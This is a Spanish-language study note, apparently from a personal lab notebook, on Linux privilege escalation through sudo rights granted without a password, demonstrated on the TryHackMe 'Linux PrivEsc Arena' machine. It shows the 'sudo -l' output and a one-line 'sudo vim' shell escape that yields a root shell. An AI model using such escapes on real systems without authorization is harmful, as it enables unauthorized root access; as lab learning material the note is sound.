El comando Sudo es una maravilla, nos permite a los usuarios normales ejecutar comandos como root, cambiarnos rapidamente de usuarios a root, claro que todo esto con la contraseña, porque si no seria muy inseguro... ¿Verdad? ¿VERDAD? bueno pues, lamento decir que este comando no es completamente seguro, aunque cabe decir que la culpa suele ser mas de lo susuarios que otorgan permisos que no deberian, a que me refiero con esto, bueno pues primero hay que entender que hace la opcion:

```bash
sudo -l
```

Esta opcion lo que hace es mostrar los comandos que un usuario normal puede ejecutar como root sin necesidad de una contraseña, o solo usando la contraseña del propio usuario, usualmente la vulnerabilidad se encuentra en scripts o aplicaciones personalizadas a las alguno usuarios que no deberian pueden ejecutarlas como root y esto noes puede ayudar a escapar de nuestra shell, ejecutar una reverse shell como root, etc, el punto es que no siempre es asi, muchas veces hay apicaciones predeterminadas de Unix que están definidas con esta configuración de sudo, y para explotar esta vulnerabilidad en casos como estos podemos hacer uso de la pagina GTOFBins ubicada en la seccion de paginas interesantes: [[Privilegie Scalation - Linux#Explotación]] 

Ahora voy a usar de ejemplo una maquina altamente vulnerable de THM (Try Hack Me) llamada Linux PrevEsc Arena


```bash
TCM@debian:~$ sudo -l                                                                   Matching Defaults entries for TCM on this host:                                         env_reset, env_keep+=LD_PRELOAD                                                                                                                                                 User TCM may run the following commands on this host:                                   (root) NOPASSWD: /usr/sbin/iftop                                                        (root) NOPASSWD: /usr/bin/find                                                          (root) NOPASSWD: /usr/bin/nano                                                          (root) NOPASSWD: /usr/bin/vim                                                           (root) NOPASSWD: /usr/bin/man                                                           (root) NOPASSWD: /usr/bin/awk                                                           (root) NOPASSWD: /usr/bin/less                                                          (root) NOPASSWD: /usr/bin/ftp                                                           (root) NOPASSWD: /usr/bin/nmap                                                          
(root) NOPASSWD: /usr/sbin/apache2                                                      (root) NOPASSWD: /bin/more  
```

Como se puede ver aqui, esta maquina es altamente vulnerable por todos los posibles comandos que se puede ejecutar con permisos sudo, y aqui podemos usar varias de las funciones/comandos que nos otorga GTOFBins:


![[Pasted image 20240815212450.png]]

Y a continuacion el uso en la maquina y su resultado (en mi caso pongo /bin/bash en vez de /bin/sh porque la verdad prefiero mucho mas una bash que una sh):

```bash
TCM@debian:~$ sudo vim -c ':!/bin/bash'                                                                                                                                        root@debian:/home/user# whoami
root                                                                                    root@debian:/home/user#
```

Como pueden ver pudimos realizar una escalada de privilegios exitosamente, y esto lo podemos repetir con la mayoria de los comandos que vimos con sudo -l

¿La mayoria?, si, la mayoria, porque los comandos que no se pueden con el metodo visto aqui, como puede ser apache2 o wget, lo veremos en [[Explotando visualizacion de archivos privilegiados con sudo]]
